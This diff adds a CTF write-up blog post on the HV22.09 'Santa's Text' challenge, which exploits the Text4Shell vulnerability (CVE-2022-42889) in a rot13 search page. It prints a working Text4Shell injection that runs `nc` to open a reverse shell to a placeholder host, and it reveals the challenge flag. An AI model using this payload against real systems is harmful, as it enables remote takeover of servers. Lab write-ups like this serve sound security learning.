@@ -1,0 +1,28 @@
+---
+title: "[HV22.09] Santa's Text"
+date: 2022-12-09 13:25:29 +0100
+categories: HV22 CTF penetration medium exploit reverse shell
+---
+
+Santa recently created some Text with a 🐚, which is said to be vulnerable code. Santa has put this Text in his library, putting the library in danger. He doesn't know yet that this could pose a risk to his server. Can you backdoor the server and find all of Santa's secrets?
+
+# Solution
+
+So, we got a website again, which looks like this:
+![challenge website](/assets/hv22/hv22_09_website.png)
+
+When we enter some string in the search box, we get it displayed back, shifted with rot13. Usual escape characters like single quotes, double quotes, backslash etc. seem to pass fine, so no visible injection possible at least.
+
+While reading the challenge description again, there are two things sticking out. First, the word **Text** comes up twice and is written with a capital T, and the word shell is written as an emoji. Second, in the description, it is mentioned, that if a reverse shell is needed, VPN has to be used.
+
+The game plan is to find an exploit the vulnerability, and then to get a reverse shell working.
+
+Searching the internet for "text shell vulnerability", you quite quickly land at Text4Shell (CVE-2022-42889) and some [example pocs](https://github.com/securekomodo/text4shell-poc) for it.
+
+It looks like we only have to input `${script:javascript:java.lang.Runtime.getRuntime().exec('nc x.x.x.x 3456 -e /bin/bash')}` and then wait for a connection from the target. Of course, it didn't work because of rot13, but since the website already gives me the rot13 version of the string, I can just copy paste it again to get a shell:
+
+![got a reverse shell](/assets/hv22/hv22_09_shell.png)
+
+From here, it's just a bit of looking around for the flag, which shouldn't be too hard since we already are root. The file /SANTA/FLAG.txt (quite easy to find) gives us the flag **HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}**
+
+![got the flag](/assets/hv22/hv22_09_flag.png)
